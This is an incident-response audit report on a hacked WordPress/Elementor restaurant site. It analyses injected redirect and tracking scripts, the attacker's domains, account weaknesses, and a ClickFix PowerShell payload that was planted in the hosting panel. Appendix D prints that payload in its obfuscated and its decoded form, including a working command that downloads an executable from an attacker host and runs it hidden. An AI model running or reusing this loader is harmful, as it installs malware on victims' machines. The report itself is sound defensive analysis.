# Security Audit Report: example-bistro.invalid

**Date:** March 10, 2026 (Updated March 18, 2026)
**Auditor:** Security Analysis
**Status:** COMPROMISED -- Immediate Action Required

---

## Executive Summary

The website example-bistro.invalid (a WordPress/Elementor site for Example Bistro, a restaurant at [REDACTED CLIENT ADDRESS]) has been compromised with malicious JavaScript injection. The injected code redirects visitors to unrelated external domains and exfiltrates tracking data through fake analytics services. DNS infrastructure is clean -- the compromise is at the application layer.

**Critical finding from backup analysis:** The All-in-One WP Migration backup (taken March 8, 2026) is **completely clean** -- zero traces of malicious code in either the file system or database. This means the injection is happening **outside of wp-content and the database**, most likely in WordPress core files, `.htaccess`, `wp-config.php`, or at the server/hosting level. These files are NOT included in the AI1WM backup format.

---

## Finding 1: Malicious Script Injection (CRITICAL)

Unauthorized JavaScript has been injected into the **live site** that loads payloads from four fake "analytics" domains:

| Malicious Domain | TLD | Notes |
|---|---|---|
| `webanalytics-cdn.sbs` | .sbs | Cheap/disposable TLD |
| `webanalytics-cdn.cyou` | .cyou | Cheap/disposable TLD |
| `webanalytics-cdn.cfd` | .cfd | Cheap/disposable TLD |
| `webanalytics-cdn.icu` | .icu | Cheap/disposable TLD |

**These are not legitimate analytics services.** The identical `webanalytics-cdn` label registered across 4 disposable TLDs is a classic domain rotation strategy -- if one domain is blocked or taken down, the others continue operating.

The injected scripts:
- Collect visitor data (IP hashes, referral URLs, page visited)
- Use `navigator.sendBeacon()` as a fallback data exfiltration method
- Include iframe-removal code targeting `position:fixed` elements with high z-index, suggesting awareness of competing malware or overlay-based defenses

---

## Finding 2: Active Redirect Chain (CRITICAL)

The injected code contains a redirect URL parameter:

```
https://landbankseeds.com?src=www.example-bistro.invalid
```

- `landbankseeds.com` is entirely unrelated to Example Bistro
- The `src=www.example-bistro.invalid` parameter identifies which compromised site is sending the traffic (monetization tracking for the attacker)
- This is the most likely cause of the reported redirect incident
- The user who reported being redirected to "another site based in Metro" may have associated the word "Metro" from the client site domain name with the redirect destination, or `landbankseeds.com` may further redirect to other sites dynamically

---

## Finding 3: Attacker Infrastructure Analysis

All 5 malicious domains resolve to Cloudflare proxy IPs, hiding true origin servers:

| Domain | IPv4 (Cloudflare) |
|---|---|
| webanalytics-cdn.sbs | 104.21.92.193 / 172.67.197.89 |
| webanalytics-cdn.cyou | 104.21.63.143 / 172.67.146.168 |
| webanalytics-cdn.cfd | 104.21.67.79 / 172.67.218.112 |
| webanalytics-cdn.icu | 104.21.10.94 / 172.67.162.196 |
| landbankseeds.com | 104.21.62.243 / 172.67.140.163 |

**Assessment:** This is an organized operation using Cloudflare free-tier accounts for anonymity, SSL, and DDoS protection. The domain rotation across cheap TLDs and uniform naming convention indicate a campaign targeting multiple WordPress sites, not a targeted attack against Example Bistro specifically.

---

## Finding 4: Backup Is Clean -- Injection Is Outside wp-content (CRITICAL)

**The All-in-One WP Migration backup (.wpress) from March 8, 2026 contains zero traces of the malware.**

### What was scanned:
- 18,897 files across themes, plugins, uploads, and cache directories
- Full 20.88 MB database dump (all tables)
- Comprehensive search for: `webanalytics-cdn`, `landbankseeds`, `eval(base64_decode`, `shell_exec`, `gzinflate`, `str_rot13`, known webshell signatures, and 30+ other malware indicators

### What this means:
The AI1WM backup captures `wp-content/` and the database, but does **NOT** capture:
- **WordPress core files** (`wp-includes/`, `wp-admin/`, root `index.php`, `wp-load.php`, etc.)
- **`.htaccess`** (Apache rewrite/redirect rules)
- **`wp-config.php`** (PHP configuration, could have injected code)
- **Server-level configuration** (Apache/PHP modules, `auto_prepend_file` directives)
- **Files outside the WordPress directory**

### Most likely injection locations (in order of probability):
1. **`.htaccess`** -- Malicious redirect rules or PHP code injection via `php_value auto_prepend_file`
2. **WordPress core files** -- Modified `wp-includes/` files (e.g., `wp-includes/template-loader.php` or `wp-includes/default-filters.php`)
3. **`wp-config.php`** -- Injected `require()` or inline PHP at the top/bottom
4. **`index.php` (root)** -- Modified to include malicious loader
5. **Server-level** -- SharedHost Provider shared hosting compromise or rogue PHP module

---

## Finding 5: DNS Infrastructure is Clean

DNS records are consistent and properly configured. No DNS hijacking detected.

| Check | Result |
|---|---|
| A Record | [IP-REDACTED] (SharedHost Provider shared hosting) |
| Consistent across resolvers | Yes (Google 8.8.8.8, Cloudflare 1.1.1.1, local) |
| Nameservers | ns1/ns2/ns3.sharedhost.invalid |
| MX Records | mx1/mx2.mail-relay.invalid |
| SPF Record | `v=spf1 mx include:netblocks.sharedhost.invalid include:relay.mail-relay.invalid -all` (properly configured, hard fail) |
| DMARC Record | **NOT FOUND** (gap) |
| SOA Serial | 2026030800 (updated March 8, 2026) |
| Default TTL | 60 seconds (unusually low) |

The previously reported "DNS not propagated worldwide" issue may relate to:
- The recent SOA update on March 8, 2026
- The very low 60-second TTL causing inconsistent caching behavior
- A transient resolver issue

---

## Finding 6: Related Metro Domains (No Connection Found)

two unrelated look-alike restaurant domains were investigated as potential redirect targets:

| Domain | IP | Host | Connection to example-bistro.invalid |
|---|---|---|---|
| example-bistro-alt-1.invalid | [IP-REDACTED] | netcup.net (Germany) | None. SSL certificate expired. |
| example-bistro-alt-2.invalid | [IP-REDACTED] | Strato AG (Germany) | None. Independent site. |
| example-bistro-alt-3.invalid | N/A | No DNS records | Unregistered or parked |
| example-bistro-alt-4.invalid | No A record | Exists but no hosting | Not serving traffic |

**None of these domains share any infrastructure** (IPs, nameservers, hosting, mail) with example-bistro.invalid.

---

## Finding 7: WordPress User Audit (MODERATE CONCERN)

All 4 user accounts in the database have **administrator** privileges:

| ID | Username | Email | Created | Name |
|---|---|---|---|---|
| 1 | Manager | [EMAIL-REDACTED] | 2014-04-15 | Manager |
| 2 | SiteOwnerUser | [EMAIL-REDACTED] | 2014-09-02 | Site Owner |
| 4 | webagency | agency-dev-1-agency.invalid | 2023-07-13 | Agency Developer 1 |
| 5 | AgencyAdmin2 | agency-dev-2-agency.invalid | 2023-09-22 | Agency Developer 2 |

**Issues:**
- All 4 users are administrators -- too many admin accounts increases attack surface
- Users 4 & 5 (Web Agency) appear to be web developers -- should use Editor or lower role if not actively maintaining
- User 1 ("Manager") has a generic username -- potential target for brute force
- **active_plugins = `a:0:{}`** at backup time -- all plugins were deactivated, which is unusual and may indicate the site was being migrated or someone was troubleshooting

---

## Finding 8: Hide My WP Configuration (MODERATE CONCERN)

The "Hide My WP" security plugin is configured with:

| Setting | Value | Assessment |
|---|---|---|
| Login URL | `/hidden-login` (instead of `/wp-login.php`) | Obscurity, not security |
| Admin Key | `[REDACTED-BYPASS-KEY]` | Weak -- derived from owner's name |
| Previous Admin Key | `1234` (in undo config) | Extremely weak |
| Full Hide | Enabled | Hides WP signatures |
| Email From | [EMAIL-REDACTED] | Owner contact |

The admin key was previously `1234`, which is trivially guessable. While it was changed to `[REDACTED-BYPASS-KEY]`, this is still a weak key based on the owner's name.

---

## Finding 9: Email Security Gaps (MODERATE)

| Control | Status |
|---|---|
| SPF | Configured with hard fail (-all) |
| DMARC | **Missing** -- attackers could spoof emails from @example-bistro.invalid |
| DKIM | Unknown (requires selector-specific lookup) |
| Klaviyo | Verified (email marketing integration present) |

Without DMARC, the domain is vulnerable to email spoofing even with a properly configured SPF record. Given the site compromise, the attacker may already have information useful for phishing campaigns using the restaurant's identity.

---

## Finding 10: Hosting Account Migration History

Two different server paths were found in the database:
- `/home/siteuser00/example-bistro.invalid/` -- referenced in older GOTMLS anti-malware scan logs (2015)
- `/home/siteuser01/example-bistro.invalid/` -- referenced in recent transient data (2023-2025)

This indicates the hosting account changed at some point (possibly a SharedHost Provider account migration). Previous malware scanning was performed in 2015, suggesting a history of security concerns.

---

## Hosting & Technology Stack

| Component | Details |
|---|---|
| CMS | WordPress |
| Page Builder | Elementor Pro 3.32.1 |
| Theme | hello-biz-child (child of hello-biz) |
| Previous themes | kaon, kaon-child-child, lemonchili |
| Hosting Provider | SharedHost Provider (shared hosting) |
| Server IP | [IP-REDACTED] |
| Server Path | /home/siteuser01/example-bistro.invalid/ |
| Email Relay | Mail Relay (via SharedHost Provider) |
| Marketing Platform | Klaviyo |
| Cache | LiteSpeed Cache, WP Rocket |
| Security | Hide My WP, Wordfence (WAF rules present) |
| Backup | All-in-One WP Migration |
| Other | Jetpack, WooCommerce, Neuron Builder, Revolution Slider, UpdraftPlus, Code Snippets, WPCode |
| IPv6 | Not enabled |

---

## Likely Attack Vector

Based on the evidence (clean backup, compromised live site), the most probable compromise paths are:

1. **Modified WordPress core files** -- Attacker modified files in `wp-includes/` or `wp-admin/` to inject the script on every page load. These files are NOT captured by AI1WM backups.
2. **`.htaccess` injection** -- Malicious `php_value auto_prepend_file` directive pointing to a PHP file that injects JavaScript into all responses.
3. **`wp-config.php` injection** -- Malicious `require()` or inline code added to wp-config.php.
4. **Root `index.php` modification** -- The main WordPress index.php was altered to include a malicious loader.
5. **Server-level compromise** -- Possible SharedHost Provider shared hosting neighbor attack or compromised hosting account credentials (FTP/SFTP).

**The injection is NOT in any plugin, theme, or database content.** This narrows the investigation to server-side files outside wp-content/.

---

## Finding 11: Malware Payload in SharedHost Provider SSH/SFTP Configuration (CRITICAL)

**Date Discovered:** March 18, 2026

A malicious PowerShell script was found planted in the **SSH/SFTP username field** within the SharedHost Provider hosting panel. The field, which should contain only a short username, instead contained an XOR-obfuscated payload disguised as a Cloudflare CAPTCHA verification.

### The Trap

The payload begins with the comment:
```
# I am not a robot - Cloudflare ID: 85f261d8487fffbd
```

This social engineering text is designed to look like a legitimate Cloudflare verification. The remainder is a hex-encoded, XOR-encrypted PowerShell script. When decoded, it performs the following:

### Decoded Behavior (step by step):

1. **Forces TLS 1.2** for encrypted communication
2. **Creates a temporary directory** with a randomized name in `%TEMP%`
3. **Downloads a malicious executable** from:
   ```
   https://webanalytics-cdn.cfd/api/index.php?a=dl&token=0c1bad9a7f58ee73b344fe187a616e97589e9e530acdabab057b4c439c58e74d&src=cloudflare&mode=cloudflare
   ```
4. **Retries up to 3 times** with 2-second delays if the download fails
5. **Executes the downloaded .exe in a completely hidden window** (`-WindowStyle Hidden`)
6. **Deletes the executable after running** to cover its tracks
7. **The entire process runs inside a hidden PowerShell child process** -- invisible to the user

### Significance

- The download URL is **`webanalytics-cdn.cfd`** -- one of the four malicious domains already identified in Finding 1
- The `token` parameter likely uniquely identifies this campaign or victim
- The `src=cloudflare&mode=cloudflare` parameters match the fake Cloudflare verification theme
- This technique is known as a **"ClickFix" or "paste-jacking" attack** -- the victim is tricked into copying and pasting the command into a terminal or Run dialog

### What This Proves

1. **The attacker has (or had) access to the SharedHost Provider hosting panel** -- this is the only way to modify the SSH/SFTP username field
2. **The SharedHost Provider panel was used as a secondary attack vector** -- even after the website was compromised, the panel was booby-trapped to compromise any administrator's local machine
3. **The initial compromise likely occurred via this same technique** -- an administrator was probably tricked into running a similar payload, which stole their SharedHost Provider credentials, giving the attacker panel access to inject the website malware

### Additional Panel Findings

- **SSH access was enabled** in the SharedHost Provider panel, but the configuration fields were left blank/improperly configured
- This is consistent with the attacker enabling SSH to plant the payload but not completing a legitimate SSH setup

---

## Finding 12: WordPress XML Export Analysis (March 18, 2026)

A WordPress XML export (WXR format) was taken on March 18, 2026 and analyzed for malicious content.

### Results: CLEAN

- **756 content items** exported (659 attachments, 30 nav items, 29 Elementor templates, 25 pages, 2 posts)
- **Zero matches** for any malicious domains, scripts, or code injection patterns
- **Zero suspicious PHP patterns** (eval, base64_decode, exec, system, passthru, etc.)
- **Zero suspicious JavaScript patterns** (document.cookie, window.location, navigator.sendBeacon, etc.)

### Notable Observations

- **Only 3 of 4 WordPress users appear in the export** -- AgencyAdmin2 (user ID 5) has zero content and does not appear at all; user ID 3 is missing (deleted account)
- **Legitimate external integrations confirmed:** Tripleseat (events), OpenTable (reservations), Square (gift cards), Upserve (ordering), Klaviyo (email marketing)
- **106 leftover NeuronThemes demo content references** from the Kaon theme remain in the database as GUIDs -- not a security issue but indicates incomplete cleanup from theme migration
- **Content authored via ChatGPT:** 5 URLs on the About page contain `utm_source=chatgpt.com` tracking parameters

This result is consistent with Findings 4 and the backup analysis -- the malware exists only in server-side files outside of the WordPress content layer.

---

## Revised Attack Chain (Updated March 18, 2026)

Based on all evidence collected, the most likely sequence of events:

```
1. Attacker launches mass campaign targeting WordPress sites (Feb 18, 2026)
   - Registers 4 "webanalytics-cdn" domains in 40 seconds via Global Domain Group LLC
   - Configures all domains behind Cloudflare free tier for anonymity

2. Site administrator encounters a fake Cloudflare CAPTCHA page
   - Either on the already-compromised site, via phishing email, or via malicious ad
   - Page instructs: "Verify you are human -- press Win+R, paste this, press Enter"
   - The "verification" text is actually an obfuscated PowerShell payload

3. Payload executes on the administrator's Windows PC
   - Downloads and runs a trojan from webanalytics-cdn.cfd
   - Trojan is invisible (hidden window) and self-deleting
   - Trojan harvests saved credentials from browsers, including SharedHost Provider panel login

4. Attacker gains SharedHost Provider panel access using stolen credentials
   - Modifies server-side files to inject JavaScript redirect/tracking code
   - Enables SSH, plants a second copy of the PowerShell payload in the username field
   - Does NOT touch wp-content/ or the database (hence clean backups)

5. Compromised website begins redirecting visitors
   - JavaScript loads from webanalytics-cdn.{sbs,cyou,cfd,icu}
   - Visitors are redirected to landbankseeds.com with source tracking
   - Visitor data is exfiltrated via navigator.sendBeacon()

6. The SSH username trap waits for the next administrator to copy-paste it
   - If triggered, the cycle repeats: new machine compromised, credentials stolen
```

**Confidence Level:** HIGH -- The discovery of the PowerShell payload downloading from the same `webanalytics-cdn.cfd` domain directly links the panel compromise to the website injection campaign.

---

## Appendix A: Raw DNS Records

```
example-bistro.invalid
  A:     [IP-REDACTED]
  NS:    ns1.sharedhost.invalid, ns2.sharedhost.invalid, ns3.sharedhost.invalid
  MX:    0 mx1.mail-relay.invalid, 0 mx2.mail-relay.invalid
  TXT:   v=spf1 mx include:netblocks.sharedhost.invalid include:relay.mail-relay.invalid -all
  TXT:   klaviyo-site-verification=VshnBh
  SOA:   ns1.sharedhost.invalid hostmaster.invalid 2026030800
  AAAA:  (none)
  CNAME: (none)
```

## Appendix B: Backup Archive Contents Summary

| Directory | Files | Size |
|---|---|---|
| uploads/ | 6,151 | 4,639.72 MB |
| plugins/ | 11,665 | 205.18 MB |
| (root) | 36 | 29.09 MB |
| themes/ | 966 | 16.97 MB |
| cache/ | 75 | 4.19 MB |
| jetpack-waf/ | 4 | 178 B |
| **Total** | **18,897** | **~4.89 GB** |

## Appendix C: Malware Scan Results Summary

| Pattern Searched | Matches in Backup |
|---|---|
| webanalytics-cdn | **0** |
| landbankseeds | **0** |
| eval(base64_decode | **0** |
| eval(gzinflate | **0** |
| shell_exec | **0** |
| Known webshell signatures (c99, r57, WSO, FilesMan, b374k) | **0** |
| Reversed function names (edoced_46esab, etc.) | **0** |
| base64_decode (all) | 50 (all legitimate -- WP Rocket, Elementor, Jetpack) |
| eval( (all) | 28 (all legitimate -- JS map styles, Lottie, Webpack) |
| create_function | 12 (all legitimate -- Jetpack changelogs, theme widgets) |

## Appendix D: Decoded PowerShell Payload

**Source:** SharedHost Provider panel SSH/SFTP username field
**Discovered:** March 18, 2026
**Obfuscation:** XOR encryption with key `pgtPYT`, hex-encoded

### Raw (obfuscated):
```
<# I am not a robot - Cloudflare ID: 85f261d8487fffbd #>
$k='pgtPYT';$d='541604393f251b5a...';$r='';
for($p=0;$p -lt $d.Length;$p+=2){
  $r+=[char](([convert]::ToInt32($d.Substring($p,2),16))-bxor[int][char]$k[$p/2%$k.Length])
};
&([ScriptBlock]::Create($r))
```

### Decoded payload:
```powershell
$qpifqk='[System.Net.ServicePointManager]::SecurityProtocol=
  [System.Net.SecurityProtocolType]::Tls12;
$t=Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName());
New-Item -ItemType Directory -Path $t -Force|Out-Null;
$f=Join-Path $t ([System.IO.Path]::GetRandomFileName()+''.exe'');
$ok=0;
for($i=0;$i -lt 3 -and -not $ok;$i++){
  try{
    Invoke-WebRequest -Uri ''https://webanalytics-cdn.cfd/api/index.php
      ?a=dl
      &token=0c1bad9a7f58ee73b344fe187a616e97589e9e530acdabab057b4c439c58e74d
      &src=cloudflare
      &mode=cloudflare'' -OutFile $f -UseBasicParsing;
    if(Test-Path $f){$ok=1}
    else{Start-Sleep -Seconds 2}
  }catch{Start-Sleep -Seconds 2}
};
if(-not (Test-Path $f)){exit};
Start-Process -FilePath $f -WindowStyle Hidden;
try{Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue}catch{};';
Start-Process -WindowStyle Hidden powershell -ArgumentList
  '-NoProfile','-WindowStyle','Hidden','-Command',$qpifqk;
exit
```

### IOCs from this payload:
| Indicator | Type | Value |
|---|---|---|
| Download URL | URL | `https://webanalytics-cdn.cfd/api/index.php?a=dl&token=0c1bad9a7f58ee73b344fe187a616e97589e9e530acdabab057b4c439c58e74d&src=cloudflare&mode=cloudflare` |
| C2 Domain | Domain | `webanalytics-cdn.cfd` |
| API Endpoint | Path | `/api/index.php` |
| Campaign Token | Token | `0c1bad9a7f58ee73b344fe187a616e97589e9e530acdabab057b4c439c58e74d` |
| XOR Key | Key | `pgtPYT` |
| Fake Cloudflare ID | String | `85f261d8487fffbd` |
